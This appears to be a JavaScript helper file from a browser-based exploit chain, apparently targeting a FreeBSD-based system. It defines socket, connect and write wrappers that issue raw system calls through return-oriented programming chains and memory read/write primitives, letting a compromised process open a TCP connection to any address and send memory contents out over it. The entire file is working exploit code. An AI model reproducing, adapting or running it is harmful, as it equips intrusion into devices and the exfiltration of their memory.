var AF_INET = 2
var SOCK_STREAM = 1

function socket() {
    var r = new RopChain()
    var ret = storage.alloc(0x4)
    r.syscall(97, AF_INET, SOCK_STREAM, 0)
    r.add('pop rdi')
    r.add(ret)
    r.add('mov qword ptr [rdi], rax')
    r.execute()
    var ret = read32(ret)
    storage.free(0x4)
    return ret
}

function connect_helper(fd, ip, port) {
    var c = new Uint32Array(0x10);
    var nums = ip.split('.')
    for (var i = 0; i < 4; i++)
        nums[i] = parseInt(nums[i])
    c[0] |= ((port >> 0x8) & 0xFF) << 0x10 | (port) << 0x18
    c[0] |= 0x2 << 0x8
    c[1] = nums[3] << 24 | nums[2] << 16 | nums[1] << 8 | nums[0]
    var r = new RopChain()
    var ret = storage.alloc(0x4)
    var sock_addr_buf = storage.alloc(0x10)
    write_data(sock_addr_buf, c)
    r.syscall(98, fd, sock_addr_buf, 0x10)
    r.add('pop rdi')
    r.add(ret)
    r.add('mov qword ptr [rdi], rax')
    r.execute()
    var ret = read32(ret)
    storage.free(0x10 + 0x4)
    return ret;

}

function write(fd, addr, len) {
    var r = new RopChain()
    var ret = storage.alloc(0x4)
    r.syscall(4, fd, addr, len);
    r.add('pop rdi')
    r.add(ret)
    r.add('mov qword ptr [rdi], rax')
    r.execute()
    var ret = read32(ret)
    storage.free(0x4)
    return ret;
}
